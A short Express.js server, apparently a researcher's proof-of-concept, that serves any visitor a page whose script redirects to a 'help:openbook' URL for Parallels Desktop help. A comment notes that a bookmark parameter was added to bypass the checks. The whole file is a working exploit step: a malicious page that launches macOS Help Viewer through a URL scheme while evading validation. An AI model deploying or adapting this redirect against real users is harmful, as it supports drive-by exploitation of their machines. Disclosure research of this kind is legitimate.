const express = require("express");
const app = express();

app.all("*", (req, res) => {
  // open Helpviewer.app
  // &bookmark=h38361 was added to bypass the checks
  res.send(
    "<h1>@Metnew</h1><script>location.href = 'help:openbook=com.parallels.desktop.console.help&bookmark=h38361';</script>"
  );
});

app.listen(5000);
